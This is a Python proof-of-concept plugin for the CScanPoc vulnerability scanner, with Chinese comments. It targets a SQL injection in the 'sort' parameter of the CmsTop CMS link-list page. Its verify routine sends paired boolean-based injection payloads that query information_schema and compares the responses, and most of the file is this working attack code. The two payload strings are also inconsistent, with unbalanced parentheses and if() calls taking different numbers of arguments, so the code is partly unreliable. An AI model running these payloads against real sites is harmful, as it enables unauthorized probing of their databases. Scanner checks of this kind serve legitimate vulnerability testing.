# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CmsTop_0003_L'  # 平台漏洞编号，留空
    name = 'CmsTop SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-09'  # 漏洞公布时间
    desc = '''
        注册账号后，在选择链接分类的时候，会发生如下链接
        http://site.cmstop.cn/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc&category=2
        但是其中的sort参数过滤不严格，导致了一个order by后面的mysql注入
        利用mysql的报错特性进行注入，当1=1会正在，1=2就会异常了，其实mysql会抛出一个Subquery returns more than 1 row的异常，利用这个特性，我们可以进行注入
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3502/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'CmsTop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '917d07dd-1421-447a-9a6e-74bda7e51316'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 首先注册用户登录。
            s = requests.session()
            # 获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            '''
            s.get(self.target, cookies=cookies)
            payload_normal = "/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=1,1,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2"
            payload_abnormal = "/link/index/list?type=1&offset=0&limit=50&_=1440172313381&sort=desc,if(1=2,1)='1',1,(select%201%20from%20information_schema.TABLES))&category=2"
            url_normal = self.target + payload_normal
            url_abnormal = self.target + payload_abnormal
            r_normal = s.get(url_normal)
            r_abnormal = s.get(url_abnormal)

            if r_normal.text != r_abnormal.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
